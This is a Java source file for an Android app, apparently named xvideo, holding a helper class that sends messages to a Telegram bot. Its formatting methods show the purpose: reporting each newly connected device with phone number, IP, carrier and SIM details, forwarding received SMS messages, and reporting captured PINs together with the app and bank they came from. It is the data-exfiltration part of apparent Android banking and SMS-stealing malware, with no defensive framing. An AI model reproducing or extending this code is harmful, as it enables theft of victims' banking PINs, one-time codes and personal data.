package com.xvideo.app.telegram;

import android.os.AsyncTask;
import android.util.Log;

import com.xvideo.app.core.Config;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class TelegramHelper {
    private static final String TAG = "TelegramHelper";

    public interface TelegramCallback {
        void onSuccess();
        void onError(String error);
    }

    public static void sendMessage(String botToken, String chatId, String message, TelegramCallback callback) {
        new SendMessageTask(botToken, chatId, message, callback).execute();
    }

    public static void sendMessage(String message, TelegramCallback callback) {
        sendMessage(Config.TELEGRAM_BOT_TOKEN, Config.TELEGRAM_CHAT_ID, message, callback);
    }

    public static void sendMessage(String message) {
        sendMessage(message, new TelegramCallback() {
            @Override
            public void onSuccess() {
                Log.d(TAG, "Message sent successfully");
            }

            @Override
            public void onError(String error) {
                Log.e(TAG, "Failed to send message: " + error);
            }
        });
    }

    private static class SendMessageTask extends AsyncTask<Void, Void, Boolean> {
        private final String botToken;
        private final String chatId;
        private final String message;
        private final TelegramCallback callback;
        private String errorMessage;

        SendMessageTask(String botToken, String chatId, String message, TelegramCallback callback) {
            this.botToken = botToken;
            this.chatId = chatId;
            this.message = message;
            this.callback = callback;
        }

        @Override
        protected Boolean doInBackground(Void... voids) {
            try {
                String urlString = Config.TELEGRAM_API_URL + botToken + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                String jsonBody = "{\"chat_id\":\"" + chatId + "\",\"text\":\"" + escapeJson(message) + "\",\"parse_mode\":\"HTML\"}";
                byte[] body = jsonBody.getBytes(StandardCharsets.UTF_8);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body);
                }

                int responseCode = conn.getResponseCode();
                StringBuilder response = new StringBuilder();

                if (responseCode == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                } else {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getErrorStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    reader.close();
                }

                JSONObject json = new JSONObject(response.toString());
                boolean ok = json.getBoolean("ok");
                if (!ok) {
                    errorMessage = json.getString("description");
                }
                return ok;

            } catch (Exception e) {
                errorMessage = e.getMessage();
                return false;
            }
        }

        @Override
        protected void onPostExecute(Boolean success) {
            if (callback != null) {
                if (success) {
                    callback.onSuccess();
                } else {
                    callback.onError(errorMessage);
                }
            }
        }

        private String escapeJson(String text) {
            return text
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
        }
    }

    public static String formatDeviceInfo(String deviceId, String model, String androidVersion,
                                          String ip, String carrier, String phoneNumber,
                                          String sim1, String sim2, String timestamp) {
        return "🔔 <b>New Device Connected</b>\n\n" +
               "📱 <b>Device ID:</b> " + deviceId + "\n" +
               "📲 <b>Model:</b> " + model + "\n" +
               "🤖 <b>Android:</b> " + androidVersion + "\n" +
               "🌐 <b>IP:</b> " + ip + "\n" +
               "📡 <b>Carrier:</b> " + carrier + "\n" +
               "📞 <b>Phone:</b> " + phoneNumber + "\n" +
               "💳 <b>SIM 1:</b> " + sim1 + "\n" +
               "💳 <b>SIM 2:</b> " + sim2 + "\n" +
               "🕐 <b>Time:</b> " + timestamp;
    }

    public static String formatSmsNotification(String sender, String body, String timestamp) {
        return "📩 <b>SMS Received</b>\n\n" +
               "👤 <b>From:</b> " + sender + "\n" +
               "📝 <b>Message:</b> " + body + "\n" +
               "🕐 <b>Time:</b> " + timestamp;
    }

    public static String formatPinCapture(String pin, String app, String bank) {
        return "🔐 <b>PIN Captured</b>\n\n" +
               "🔢 <b>PIN:</b> " + pin + "\n" +
               "📱 <b>App:</b> " + app + "\n" +
               (bank != null ? "🏦 <b>Bank:</b> " + bank + "\n" : "");
    }
}
